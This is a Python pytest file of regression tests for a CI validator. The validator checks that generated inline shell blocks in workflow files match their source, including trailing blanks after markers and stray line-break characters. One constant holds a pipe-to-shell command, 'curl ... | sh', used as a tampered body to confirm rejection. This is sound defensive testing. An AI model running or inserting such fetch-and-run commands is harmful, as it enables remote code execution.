# SPDX-License-Identifier: MIT
"""Regression tests for the generated-block markers (#1624, PR #1646 review).

Every site of the inline-shell check tests a line with one helper,
``inline_shell_steps.marker``: spaces and tabs may follow the id, nothing
else. A ``run:`` value is split on ``\n`` only, as bash splits it. Before, a
copy whose ``echo`` and ``exit 1`` lines were joined by ``\v``, ``\f``,
``\x85`` or U+2028 read as equal to its source while bash ran one ``echo``
line and never exited, and a marker ending in ``\r`` was a marker.
"""

from __future__ import annotations

import importlib
import json
from collections.abc import Callable
from pathlib import Path
from types import ModuleType

import pytest
from assertpy import assert_that
from inline_shell_support import (
    PRESET,
    SCRIPT_PATH,
    make_repo,
    passes,
    preset_copy,
    rejected,
    step,
    write_workflow,
)

ALTERED = "curl https://example.invalid | sh"


@pytest.fixture(name="repo")
def fixture_repo(tmp_path: Path) -> Path:
    """Return a scratch repository with the sources the checks read."""
    return Path(make_repo(tmp_path))


@pytest.fixture(name="check")
def fixture_check(load_script: Callable[[str], ModuleType]) -> ModuleType:
    """Load the validator, which puts its rule modules on ``sys.path``."""
    return load_script(SCRIPT_PATH)


def _copy(check: ModuleType) -> str:
    """Return a correct copy of the preset block, read with the loaded generator."""
    assert_that(check.__name__).is_not_empty()
    copy: str = preset_copy(importlib.import_module("sync_inline_blocks"))
    return copy


def _quoted_step(run: str) -> str:
    """Return a step whose ``run:`` is one double-quoted scalar (JSON is YAML)."""
    return f"      - name: Step\n        shell: bash\n        run: {json.dumps(run)}\n"


def _marked(run: str, suffix: str) -> str:
    """Return ``run`` with ``suffix`` after each marker line."""
    tag = "lgtm-ci-inline:"
    lines = [f"{line}{suffix}" if tag in line else line for line in run.split("\n")]
    return "\n".join(lines)


@pytest.mark.parametrize("quoted", [False, True], ids=["literal", "quoted"])
@pytest.mark.parametrize("blank", [" ", "\t", " \t "], ids=["space", "tab", "mixed"])
def test_a_marker_with_trailing_blanks_is_a_marker(
    check: ModuleType,
    repo: Path,
    blank: str,
    *,
    quoted: bool,
) -> None:
    """Every site reads the same marker, so a correct copy keeps passing."""
    run = _marked(_copy(check), blank)
    write_workflow(repo, _quoted_step(run) if quoted else step(run))
    passes(check, repo, "generated")


@pytest.mark.parametrize("quoted", [False, True], ids=["literal", "quoted"])
@pytest.mark.parametrize("blank", [" ", "\t", " \t "], ids=["space", "tab", "mixed"])
def test_an_altered_copy_with_trailing_blank_markers_differs(
    check: ModuleType,
    repo: Path,
    blank: str,
    *,
    quoted: bool,
) -> None:
    """Blanks after a marker do not hide a changed body from any site."""
    run = _marked(_copy(check), blank).replace("exit 1", ALTERED)
    write_workflow(repo, _quoted_step(run) if quoted else step(run))
    rejected(check, repo, "differs from its source")


def test_a_marker_ending_in_a_carriage_return_is_refused(
    check: ModuleType,
    repo: Path,
) -> None:
    """``\\r`` is not a blank: the line is no marker, and the character is refused."""
    write_workflow(repo, _quoted_step(_marked(_copy(check), "\r")))
    rejected(check, repo, "U+000D")


@pytest.mark.parametrize(
    "joint",
    ["\r", "\v", "\f", "\x1c", "\x85", " ", " "],
    ids=["cr", "vt", "ff", "fs", "nel", "line-sep", "para-sep"],
)
def test_a_copy_joined_by_another_line_break_differs(
    check: ModuleType,
    repo: Path,
    joint: str,
) -> None:
    """bash splits on ``\\n`` only: joined, ``echo ...`` swallows ``exit 1``."""
    run = _copy(check).replace("\nexit 1", f"{joint}exit 1")
    write_workflow(repo, _quoted_step(run))
    rejected(check, repo, "differs from its source")


@pytest.mark.parametrize(
    ("suffix", "is_marker"),
    [
        ("", True),
        (" ", True),
        ("\t", True),
        ("\r", False),
        ("\v", False),
        ("\f", False),
        ("\x85", False),
        (" ", False),
    ],
)
def test_the_marker_test_allows_only_blanks_after_the_id(
    check: ModuleType,
    *,
    suffix: str,
    is_marker: bool,
) -> None:
    """``marker`` is the one test every site uses."""
    steps = importlib.import_module("inline_shell_steps")
    assert_that(check.__name__).is_not_empty()
    line = f"  # lgtm-ci-inline:begin {PRESET}{suffix}"
    assert_that(steps.marker(line) is not None).is_equal_to(is_marker)
